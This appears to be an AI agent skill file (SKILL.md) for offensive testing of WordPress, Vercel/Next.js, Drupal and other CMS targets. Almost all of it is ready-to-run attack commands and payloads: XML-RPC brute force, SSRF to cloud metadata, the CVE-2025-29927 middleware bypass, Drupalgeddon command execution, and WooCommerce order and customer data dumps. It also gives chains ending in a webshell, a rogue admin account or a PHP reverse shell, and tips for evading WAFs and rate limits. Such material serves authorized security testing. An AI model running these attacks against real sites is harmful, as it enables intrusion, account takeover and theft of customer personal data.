## offensive-cms-wordpress-vercel

> Source: `/Users/ryan-osome-infosec/.claude/skills/offensive-cms-wordpress-vercel//SKILL.md`

---
name: offensive-cms-wordpress-vercel
description: >
  Specialist CMS assessment skill for WordPress and Vercel/Next.js targets.
  Full attack surface coverage: WordPress plugin/theme/user/API/XMLRPC/WooCommerce
  enumeration and exploitation; Vercel/Next.js middleware bypass (CVE-2025-29927),
  SSRF via image optimization, environment variable leakage, NextAuth misconfigs,
  ISR cache poisoning, source map exploitation, tRPC enumeration. Includes
  detection signatures, targeted wordlists, automated probe sequences, and escalation
  chains for 17+ CMSs including Drupal, Joomla, Ghost, Shopify, Strapi, HubSpot.
  Use when recon identifies WordPress, Vercel, Next.js, or any CMS/JAMstack technology.
version: 1.0.0
triggers:
  - wordpress
  - WordPress
  - woocommerce
  - WooCommerce
  - wp-admin
  - wp-login
  - wp-json
  - xmlrpc
  - vercel
  - Vercel
  - next.js
  - Next.js
  - nextjs
  - nextauth
  - NextAuth
  - cms detection
  - drupal
  - Drupal
  - joomla
  - Joomla
  - ghost cms
  - shopify
  - Shopify
  - strapi
  - cms assessment
  - cms scan
  - plugin vulnerability
  - theme vulnerability
  - middleware bypass
  - cms pentest
---

# SKILL: WordPress + Vercel/Next.js CMS Assessment

## Overview

This skill activates when a target is detected running **WordPress**, **Vercel/Next.js**,
or any other CMS. It replaces generic web testing with platform-specific attack sequences
that map to known vulnerability classes, CVEs, and misconfigurations.

**Wordlists used by this skill (loaded from registry):**
- `cms.wordpress-paths` → `wordlists/cms/wordpress-attack-paths.txt`
- `cms.vercel-paths` → `wordlists/cms/vercel-nextjs-paths.txt`
- `cms.detection` → `wordlists/cms/cms-detection-fingerprints.txt`
- `cms.wp-plugins-vulndb` → `wordlists/cms/wordpress-plugins-vulndb.txt`
- `cms.vercel-vectors` → `wordlists/cms/vercel-nextjs-attack-vectors.txt`

---

## Phase 0: CMS Detection (Auto-Trigger)

The scanner auto-detects CMS via:

| Signal | CMS | Confidence |
|--------|-----|-----------|
| `x-vercel-id` header | Vercel | High |
| `x-powered-by: Next.js` | Next.js | High |
| `__NEXT_DATA__` in body | Next.js | High |
| `wp-content` in body | WordPress | High |
| `x-powered-by: WordPress` | WordPress | High |
| `/wp-json/` accessible | WordPress | High |
| `wp-login.php` responds | WordPress | High |
| `x-generator: Drupal` header | Drupal | High |
| `x-drupal-cache` header | Drupal | High |
| `x-shopify-stage` header | Shopify | High |
| `generator` meta with CMS name | Various | Medium |
| CMS-specific cookies | Various | Medium |

**If CMS is detected → immediately load this skill and replace generic hunt modules with CMS-specific hunters.**

---

## Phase 1: WordPress Assessment

### 1.1 Version Fingerprinting

```bash
# Passive version detection
curl -s https://TARGET/readme.html | grep -i "version"
curl -s https://TARGET/wp-includes/js/jquery/jquery.min.js | grep "jquery v"
curl -s https://TARGET/wp-json/ | python3 -m json.tool | grep version
curl -s https://TARGET/feed/ | grep "<generator>"
curl -s "https://TARGET/?v=5.0" -I  # X-Powered-By header

# Check for specific version files
curl -s https://TARGET/wp-includes/version.php
# Look for: $wp_version = '6.x.x';
```

### 1.2 User Enumeration (3 methods)

**Method A — Author Param:**
```bash
for i in $(seq 1 10); do
  curl -s -I "https://TARGET/?author=$i" | grep -i location
done
```

**Method B — REST API:**
```bash
curl -s "https://TARGET/wp-json/wp/v2/users" | python3 -c "
import sys,json
for u in json.load(sys.stdin):
    print(f'ID:{u[\"id\"]} user:{u[\"slug\"]} name:{u[\"name\"]}')"
```

**Method C — Login error differentiation:**
```bash
# Valid user = "incorrect password"
# Invalid user = "user not found"
curl -s -X POST https://TARGET/wp-login.php \
  -d "log=admin&pwd=wrongpassword&wp-submit=Log+In"
```

### 1.3 XML-RPC Exploitation

```bash
# Check if xmlrpc.php is enabled
curl -s https://TARGET/xmlrpc.php

# List available methods
curl -s -X POST https://TARGET/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>'

# Credential brute force via multicall (bypass rate limiting)
curl -s -X POST https://TARGET/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>
    <value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
    <member><name>params</name><value><array><data>
      <value><array><data><value><string>admin</string></value><value><string>password123</string></value></data></array></value>
    </data></array></value></member></struct></value>
  </data></array></value></param></params></methodCall>'

# Port scan via SSRF through xmlrpc
curl -s -X POST https://TARGET/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params>
    <param><value><string>http://169.254.169.254/</string></value></param>
    <param><value><string>https://TARGET/</string></value></param>
  </params></methodCall>'
```

### 1.4 WP REST API Exploitation

```bash
# Unauthenticated data disclosure
curl -s "https://TARGET/wp-json/wp/v2/users" | jq '.[] | {id,name,slug,link}'
curl -s "https://TARGET/wp-json/wp/v2/posts?per_page=100" | jq '.[] | {id,title:.title.rendered,status}'
curl -s "https://TARGET/wp-json/wp/v2/media?per_page=100" | jq '.[] | {id,source_url}'
curl -s "https://TARGET/wp-json/wp/v2/settings"  # Admin-only, test without auth
curl -s "https://TARGET/wp-json/wp/v2/plugins"   # Plugin list (auth bypass test)

# Application passwords (WP 5.6+)
curl -s "https://TARGET/wp-json/wp/v2/users/me/application-passwords" \
  -H "Authorization: Basic BASE64_USER_PASS"

# WooCommerce data exposure
curl -s "https://TARGET/wp-json/wc/v3/orders"
curl -s "https://TARGET/wp-json/wc/v3/customers"
curl -s "https://TARGET/wp-json/wc/v3/coupons"
```

### 1.5 Config Backup Leaks

```bash
# Check all common config backup locations
for path in wp-config.php.bak wp-config.php~ wp-config.php.backup \
            wp-config.php.old wp-config.php.orig wp-config.php.save \
            .wp-config.php.swp backup/wp-config.php; do
  STATUS=$(curl -o /dev/null -sw "%{http_code}" "https://TARGET/$path")
  [ "$STATUS" != "404" ] && echo "FOUND: $path ($STATUS)"
done

# Check debug log
curl -s "https://TARGET/wp-content/debug.log" | head -50
```

### 1.6 Plugin Vulnerability Assessment

```bash
# Enumerate installed plugins via readme.txt
# Load from wordlist: cms.wp-plugins-vulndb
while IFS='|' read -r slug version_pattern vuln_type ref; do
  [[ $slug == \#* ]] && continue
  URL="https://TARGET/wp-content/plugins/$slug/readme.txt"
  STATUS=$(curl -o /tmp/plugin_readme.txt -sw "%{http_code}" "$URL")
  if [ "$STATUS" = "200" ]; then
    PLUGIN_VER=$(grep -i "stable tag\|version" /tmp/plugin_readme.txt | head -1)
    echo "INSTALLED: $slug | $PLUGIN_VER | CVE/Vuln: $vuln_type $ref"
  fi
done < wordlists/cms/wordpress-plugins-vulndb.txt
```

**Plugin-specific attack payloads:**

| Plugin | Attack | Payload |
|--------|--------|---------|
| Contact Form 7 < 5.8.4 | Stored XSS | `<script>alert(1)</script>` in textarea with `novalidate` tag |
| Elementor Pro < 3.15.0 | RCE | Arbitrary file upload via template import |
| WooCommerce Payments < 5.6.2 | Auth bypass | `X-WC-Webhooks-Source: wordpress` header |
| WP File Manager < 6.9 | RCE | Unauthenticated file upload via `connector` endpoint |
| Duplicator < 1.5.7.1 | Path traversal | `file=../wp-config.php` in installer |
| Advanced Custom Fields | XSS | `acf[field_key]` parameter injection |
| Gravity Forms | SQL injection | `entry_id` parameter in export |
| Ninja Forms | Code injection | `fields[id][value]` in form handler |
| RevSlider | Arbitrary upload | `admin-ajax.php?action=revslider_show_image` |
| NextGen Gallery | SQLi | `album_id` parameter |

### 1.7 WooCommerce Specific Testing

```bash
# Price manipulation — add item with manipulated price
curl -s -X POST "https://TARGET/wp-json/wc/store/v1/cart/add-item" \
  -H "Content-Type: application/json" \
  -d '{"id":1,"quantity":1,"variation":[]}'

# IDOR on orders
for id in $(seq 1 20); do
  curl -s "https://TARGET/wp-json/wc/v3/orders/$id" | jq .billing 2>/dev/null
done

# Coupon enumeration/bypass
curl -s -X POST "https://TARGET/wp-json/wc/store/v1/cart/add-coupon" \
  -d '{"code":"ADMIN"}'

# Price=0 checkout bypass
curl -s -X POST "https://TARGET/?wc-ajax=checkout" \
  -d "payment_method=bacs&order_comments=test&_wpnonce=NONCE"

# Order status manipulation
curl -s -X PUT "https://TARGET/wp-json/wc/v3/orders/ORDER_ID" \
  -H "Authorization: Basic BASE64" \
  -d '{"status":"completed"}'
```

### 1.8 wp-login.php Attack Vectors

```bash
# Username enumeration via error messages
# "ERROR: The password you entered for the username X is incorrect"
# vs "ERROR: Invalid username"

# Cookie forgery — predictable auth cookies
# wordpress_logged_in_SITEURL_HASH=user|expiry|TOKEN

# Login page CSRF
curl -s "https://TARGET/wp-login.php" | grep "_wpnonce"

# Redirect parameter manipulation
curl -s "https://TARGET/wp-login.php?redirect_to=https://evil.com"

# Password reset token prediction
curl -s "https://TARGET/wp-login.php?action=rp&key=GUESSABLE&login=admin"
```

### 1.9 WordPress Exploitation Chains

**Chain A: Unauthenticated → Admin (via plugin)**
```
1. Enumerate plugins via readme.txt
2. Find vulnerable plugin (e.g., WP File Manager < 6.9)
3. Upload webshell via unauthenticated endpoint
4. Execute: wp user create hacker hacker@evil.com --role=administrator
```

**Chain B: Author → RCE (via theme editor)**
```
1. Enumerate users → get valid username
2. Brute force via xmlrpc multicall (no lockout)
3. Login as low-priv author
4. Navigate to /wp-admin/theme-editor.php
5. Edit functions.php → inject PHP reverse shell
```

**Chain C: WooCommerce → PII Dump**
```
1. GET /wp-json/wc/v3/orders → 403 (need auth)
2. Test WooCommerce Payments auth bypass header
3. GET /wp-json/wc/v3/customers?per_page=100 → dump customer PII
```

---

## Phase 2: Vercel + Next.js Assessment

### 2.1 Deployment Fingerprinting

```bash
# Headers reveal Vercel
curl -sI "https://TARGET" | grep -i "x-vercel\|x-now\|server: vercel"

# Check deployment info
curl -s "https://TARGET/_vercel/insights/script.js" | head -5
curl -s "https://TARGET/vercel.json"
curl -s "https://TARGET/.vercel/project.json"

# Next.js build ID (stable across deployments)
curl -s "https://TARGET/_next/BUILD_ID" 2>/dev/null
# Or from: <script id="__NEXT_DATA__">...buildId...</script>
BUILD_ID=$(curl -s "https://TARGET/" | grep -oP '"buildId":"[^"]+' | cut -d'"' -f4)
echo "Build ID: $BUILD_ID"
```

### 2.2 CVE-2025-29927 — Next.js Middleware Authorization Bypass

**Severity: CRITICAL | CVSS: 9.1**

```bash
# Detect middleware protection
# Step 1: Request protected route without bypass
curl -sI "https://TARGET/admin" | grep -i "location\|status"

# Step 2: Try middleware bypass headers
for header in \
  "x-middleware-subrequest: middleware" \
  "x-middleware-invoke: 1" \
  "x-invoke-path: middleware" \
  "x-middleware-preflight: preflight"; do
  echo "=== Testing: $header ==="
  curl -s -H "$header" "https://TARGET/admin" | head -20
  curl -s -H "$header" "https://TARGET/api/admin" | head -20
  curl -s -H "$header" "https://TARGET/dashboard" | head -20
done

# Step 3: Test against authentication-protected pages
PROTECTED_PATHS=("/admin" "/dashboard" "/account" "/settings" "/api/admin" "/api/users")
for path in "${PROTECTED_PATHS[@]}"; do
  STATUS=$(curl -o /dev/null -sw "%{http_code}" "https://TARGET$path")
  BYPASS=$(curl -o /dev/null -sw "%{http_code}" -H "x-middleware-subrequest: middleware" "https://TARGET$path")
  [ "$STATUS" != "$BYPASS" ] && echo "BYPASS DETECTED: $path ($STATUS → $BYPASS)"
done
```

### 2.3 SSRF via Next.js Image Optimization

```bash
# Test internal SSRF via /_next/image
SSRF_TARGETS=(
  "http://169.254.169.254/latest/meta-data/"
  "http://169.254.169.254/latest/user-data/"
  "http://100.100.100.200/latest/meta-data/"
  "http://localhost/"
  "http://127.0.0.1:8080/"
  "http://10.0.0.1/"
  "http://192.168.1.1/"
  "file:///etc/passwd"
)

for target in "${SSRF_TARGETS[@]}"; do
  echo "Testing: $target"
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$target'))")
  curl -s "https://TARGET/_next/image?url=${ENCODED}&w=100&q=75" | head -5
done

# Check domains allowlist bypass
curl -s "https://TARGET/_next/image?url=https://evil.com/malicious.jpg&w=100&q=75"
```

### 2.4 Environment Variable Leakage

```bash
# Download main JS bundle and grep for NEXT_PUBLIC_ vars
BUILD_ID=$(curl -s "https://TARGET/" | grep -oP '"buildId":"[^"]+' | cut -d'"' -f4)

# Fetch static chunks
for chunk in main webpack framework; do
  curl -s "https://TARGET/_next/static/chunks/$chunk.js" > /tmp/${chunk}.js 2>/dev/null
done

# Search for leaked env vars
grep -oE 'NEXT_PUBLIC_[A-Z_0-9]+' /tmp/*.js 2>/dev/null | sort -u
grep -oE '(VERCEL|AWS|STRIPE|SENDGRID|TWILIO|GITHUB)_[A-Z_0-9]+' /tmp/*.js 2>/dev/null

# Check _next/data for SSR data exposure
curl -s "https://TARGET/_next/data/$BUILD_ID/index.json" | python3 -m json.tool
curl -s "https://TARGET/_next/data/$BUILD_ID/dashboard.json" | python3 -m json.tool
```

### 2.5 Source Map Exploitation

```bash
# Find accessible source maps
BUILD_ID=$(curl -s "https://TARGET/" | grep -oP '"buildId":"[^"]+' | cut -d'"' -f4)

# Common chunk names
for chunk in main framework webpack app-pages-internals; do
  STATUS=$(curl -o /dev/null -sw "%{http_code}" "https://TARGET/_next/static/chunks/$chunk.js.map")
  [ "$STATUS" = "200" ] && echo "SOURCE MAP EXPOSED: /_next/static/chunks/$chunk.js.map"
done

# Download and analyze source maps
curl -s "https://TARGET/_next/static/chunks/main.js.map" > /tmp/main.js.map
python3 -c "
import json
with open('/tmp/main.js.map') as f:
    sm = json.load(f)
print('Sources:', sm.get('sources', [])[:20])
" 2>/dev/null
```

### 2.6 NextAuth.js Assessment

```bash
# Session disclosure (unauthenticated)
curl -s "https://TARGET/api/auth/session" | python3 -m json.tool

# CSRF token exposure
curl -s "https://TARGET/api/auth/csrf" | python3 -m json.tool

# Provider enumeration
curl -s "https://TARGET/api/auth/providers" | python3 -m json.tool

# Open redirect via callbackUrl
NEXTAUTH_PATHS=(
  "/api/auth/signin?callbackUrl=https://evil.com"
  "/api/auth/callback/credentials?callbackUrl=https://evil.com"
  "/api/auth/signout?callbackUrl=https://evil.com"
  "/api/auth/callback/email?token=TEST&callbackUrl=https://evil.com"
)
for path in "${NEXTAUTH_PATHS[@]}"; do
  curl -sI "https://TARGET$path" | grep -i location
done

# JWT secret brute force (if using HS256)
# NextAuth default secret: process.env.NEXTAUTH_SECRET or process.env.SECRET
# Common weak secrets: "secret", "nextauth", "changeme", "development"
```

### 2.7 tRPC Endpoint Enumeration

```bash
# Check if tRPC is exposed
curl -s "https://TARGET/api/trpc/"

# Enumerate procedures via error messages
for procedure in "user.getAll" "user.getById" "user.create" "admin.getStats" \
                 "post.getAll" "auth.getSession" "settings.get"; do
  curl -s "https://TARGET/api/trpc/$procedure" | python3 -m json.tool
done

# Batch request enumeration
curl -s -X POST "https://TARGET/api/trpc/user.getById,user.getAll" \
  -H "Content-Type: application/json" \
  -d '[{"id":1,"method":"query","params":{"input":{"id":1}}}]'
```

### 2.8 Vercel Preview Deployment Abuse

```bash
# Test for passwordless preview access
curl -s "https://TARGET/" -H "x-vercel-protection-bypass: TOKEN"

# Check for _vercel/ paths
for path in "/_vercel/" "/_vercel/insights/" "/.vercel/" "/.vercel/project.json"; do
  STATUS=$(curl -o /dev/null -sw "%{http_code}" "https://TARGET$path")
  echo "$STATUS $path"
done
```

---

## Phase 3: Other CMS Assessment Modules

### 3.1 Drupal

```bash
# Version detection
curl -s "https://TARGET/CHANGELOG.txt" | head -3
curl -s "https://TARGET/core/CHANGELOG.txt" | head -3  # Drupal 8+
curl -s "https://TARGET/update.php"

# Drupalgeddon2 (SA-CORE-2018-002) — Drupal < 7.58, 8.x < 8.3.9
curl -s "https://TARGET/?q=user/password&name[%23post_render][]=passthru&name[%23markup]=id&name[%23type]=markup"

# Drupalgeddon3 (SA-CORE-2018-004) — authenticated
curl -s -X POST "https://TARGET/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" \
  -d 'form_id=user_register_form&_drupal_ajax=1&mail[a][@type]=markup&mail[a][@post_render][]=exec&mail[a][@markup]=id'

# JSON:API endpoint
curl -s "https://TARGET/jsonapi/user/user" | python3 -m json.tool
curl -s "https://TARGET/jsonapi/node/article" | python3 -m json.tool
```

### 3.2 Joomla

```bash
# Version detection
curl -s "https://TARGET/administrator/manifests/files/joomla.xml" | grep version
curl -s "https://TARGET/language/en-GB/en-GB.xml" | grep version

# Joomla REST API
curl -s "https://TARGET/api/index.php/v1/users"
curl -s "https://TARGET/api/index.php/v1/config"

# Config file backup
for path in configuration.php~ configuration.php.bak .configuration.php.swp; do
  curl -sI "https://TARGET/$path" | grep -E "HTTP/|Location:"
done
```

### 3.3 Ghost CMS

```bash
# Admin panel detection
curl -s "https://TARGET/ghost/" | head -20

# Ghost API enumeration
curl -s "https://TARGET/ghost/api/v4/admin/" | python3 -m json.tool
curl -s "https://TARGET/ghost/api/content/posts/?key=CONTENT_API_KEY"

# Ghost admin password reset
curl -s -X POST "https://TARGET/ghost/api/v4/admin/session/" \
  -d '{"username":"admin@TARGET","password":"password"}'
```

---

## Phase 4: CMS-Specific Payload Tables

### WordPress Injection Payloads

| Context | Payload | Type |
|---------|---------|------|
| WordPress search | `';SELECT SLEEP(5)-- -` | SQLi time-based |
| Comment form | `<img src=x onerror=alert(1)>` | Stored XSS |
| Shortcode | `[user_email user_id=2]` | IDOR |
| WooCommerce quantity | `-1` | Business logic |
| REST API meta | `{"_wp_page_template":"../../wp-config.php"}` | LFI attempt |
| XMLRPC multicall | 1000x wp.getUsersBlogs | Bruteforce |
| wp-admin/admin-ajax.php | `action=upload-attachment&nonce=VALID` | Upload bypass |
| Widget text | `<!--nextpage-->` | Content injection |
| wp_die message | `{{7*7}}` | SSTI check |
| REST search | `/wp-json/wp/v2/search?search=password&type=post&per_page=100` | Sensitive content |

### Vercel/Next.js Payloads

| Context | Payload | Type |
|---------|---------|------|
| `/_next/image?url=` | `http://169.254.169.254/` | SSRF |
| Middleware header | `x-middleware-subrequest: middleware` | Auth bypass |
| `callbackUrl` | `javascript:alert(1)` | XSS via open redirect |
| `_next/data/` | `../../../etc/passwd` | Path traversal |
| API route | `{"__proto__":{"admin":true}}` | Prototype pollution |
| `getServerSideProps` | `process.env` injection | SSRF via env |
| tRPC input | `{"cursor":{"value":"1;DROP TABLE users"}}` | SQLi via tRPC |
| Dynamic route | `/api/user/1/../admin` | Path normalization bypass |

---

## Phase 5: Evidence Collection & Escalation

### WordPress Evidence Chain

```
WordPress Version Found → CVE lookup (wpscan DB) → known exploit →
  If plugin vulnerable → check exploit-db → test PoC →
    If RCE → webshell upload → privilege escalation →
      wp user list → extract wp_users table →
        crack password hashes (bcrypt $P$) →
          admin login → site control
```

### Vercel Evidence Chain

```
Vercel detected → Check middleware protection →
  If CVE-2025-29927 applicable → bypass admin routes →
    Extract NEXT_PUBLIC_* env vars → API keys →
      Test each key → RCE/data access via external service →
        Or: SSRF via _next/image → internal services →
          Cloud metadata → AWS/GCP credentials → full cloud compromise
```

---

## Quick Reference — WPScan Commands

```bash
# Full WPScan (enumerate everything)
wpscan --url https://TARGET \
  --enumerate u,p,t,vp,vt,tt,cb,dbe,er \
  --api-token WPSCAN_API_TOKEN \
  --plugins-detection aggressive \
  --plugins-version-detection aggressive \
  --themes-detection aggressive \
  --output wpscan-results.json \
  --format json

# User enumeration only
wpscan --url https://TARGET --enumerate u --max-threads 20

# Plugin brute force
wpscan --url https://TARGET --enumerate ap --plugins-detection aggressive

# Credential brute force (via xmlrpc)
wpscan --url https://TARGET --passwords /path/to/wordlist.txt --usernames admin
```

---

## Quick Reference — Next.js/Vercel Testing One-Liners

```bash
# Extract Build ID
curl -s https://TARGET/ | grep -oP '"buildId":"[^"]+'

# Test middleware bypass on all common admin paths
for p in /admin /dashboard /settings /api/admin /api/users /management; do
  echo -n "$p: normal="
  curl -o /dev/null -sw "%{http_code} " "https://TARGET$p"
  echo -n "bypass="
  curl -o /dev/null -sw "%{http_code}\n" -H "x-middleware-subrequest: middleware" "https://TARGET$p"
done

# Dump all NEXT_PUBLIC vars from JS chunks
curl -s "https://TARGET/_next/static/chunks/main.js" | grep -oE 'NEXT_PUBLIC_\w+' | sort -u

# NextAuth session check
curl -s "https://TARGET/api/auth/session" | python3 -m json.tool
```

---

## Detection Evasion Notes

- WordPress login bruteforce: use XMLRPC multicall (single request → 1000 attempts)
- Rate limit bypass: rotate WordPress application passwords
- Plugin scanning: Use HEAD requests to reduce noise
- Vercel rate limits: Distribute across Vercel edge regions using different `x-vercel-ip-country` headers
- WAF bypass for WordPress: Use `?_wpnonce=` parameter pollution

---
